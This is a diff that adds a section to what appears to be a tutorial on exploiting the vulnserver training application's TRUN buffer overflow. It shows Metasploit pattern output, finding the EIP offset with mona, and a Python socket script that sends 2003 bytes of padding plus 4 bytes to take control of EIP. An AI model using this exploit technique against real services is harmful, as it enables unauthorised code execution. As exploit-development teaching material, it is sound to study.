@@ -61,3 +61,51 @@ After you send the vulnerable application the buffer of A's, you can observe the
 
 ![vulnserver 4]()
 
+Now that we can confirm it is vulnerable to a classic EIP overwritten buffer overflow, we need to figure out exactly how big the buffer size is when we write data into the program, it crashes with 4000 bytes, but how big is the buffer? 
+
+If we can determine how big the buffer is, we can fill it up, and the next data after it will be written into the EIP registers (4 bytes), which we need to control.
+
+We can use the pattern_create tool from metasploit, this creates a unique pattern every few bytes, if we crash the program with this, we can see exactly where the EIP register has been overwritten.
+
+```
+└─▪ ./pattern_create.rb -l 4000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6.........
+```
+
+Send this unqiue string to the application instead of all A's
+
+![vulnserver 5]()
+
+Now you can see the EIP register has been overwritten with 386F4337, this is a section of the unique pattern we sent, you can use the mona.py Immunity debugger extension as set up in the previous post (https://fullpwnops.com/immunity-windbg-mona/) to calculate this buffer size.
+
+Use the command `!mona findmsp` to have mona calculate exactly how much data it took to overwrite the EIP register.
+
+![vulnserver 6]()
+
+Now we know it took exactly 2003 bytes to fill up the input buffer, so if we send 2007 bytes, the 4 bytes after the buffer are going to overwrite the EIP register.
+
+Add this to our exploit script.
+
+```python
+import socket
+
+victim_host = "10.0.0.161"
+port = 9999
+
+payload = "A" * 2003
+payload += "B" * 4
+
+buffer_exploit = "TRUN /.:/" + payload
+
+expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+expl.connect((victim_host, port))
+expl.send(buffer_exploit)
+
+print("[x] Sent TRUN + malicious payload to the victim")
+print("[!] You may need to send it multiple times")
+expl.close()
+```
+
+Now when you re-send your exploit to the application, you can see the EIP register is now 42424242, which is our 4 B's send after our A's, we control the EIP register!
+
+Now that we can control what address get's executed next, we want to find a JMP ESP instruction, which will allow us to jump to our payload.
